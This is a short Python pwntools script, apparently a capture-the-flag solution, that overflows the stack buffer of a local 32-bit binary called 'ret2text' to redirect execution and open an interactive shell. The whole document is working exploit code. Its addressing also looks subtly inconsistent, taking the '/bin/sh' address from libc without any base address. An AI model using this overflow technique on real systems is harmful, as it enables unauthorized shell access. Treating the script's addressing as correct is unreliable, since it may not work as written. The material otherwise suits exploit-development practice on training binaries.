from pwn import *
system_addr = 0x0804863A
libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')
bin_sh_addr = next(libc.search(b'/bin/sh'))
# system_addr = 0x08048490
offset = 0x6c + 4 

sh = process("./ret2text")
sh.sendline(b'A' * offset + p32(system_addr) + b'JUNK' + p32(bin_sh_addr))
# sh.recv() 
sh.interactive()
